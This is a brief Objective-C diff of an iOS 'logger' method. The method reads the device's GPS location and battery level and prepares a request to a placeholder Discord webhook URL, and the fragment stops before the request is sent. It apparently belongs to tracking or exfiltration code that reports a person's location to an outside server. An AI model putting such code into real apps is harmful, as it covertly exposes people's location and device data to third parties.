@@ -1,3 +1,5 @@
+#include "espl.h"
+
 -(void)logger {
 
     CLLocationManager* manager = [[CLLocationManager alloc] init];
@@ -5,14 +7,11 @@
     CLLocation *location = [manager location];
     CLLocationCoordinate2D coordinate = [location coordinate];
 //getting location..
-   
-
 
     UIDevice *device = [UIDevice currentDevice];
     [device setBatteryMonitoringEnabled:YES];
     int batinfo=([device batteryLevel]*100);
     NSError *error;
-
     NSString *urlString = @"Discord Webhook Link";
 
     NSURL *url = [NSURL URLWithString:urlString];
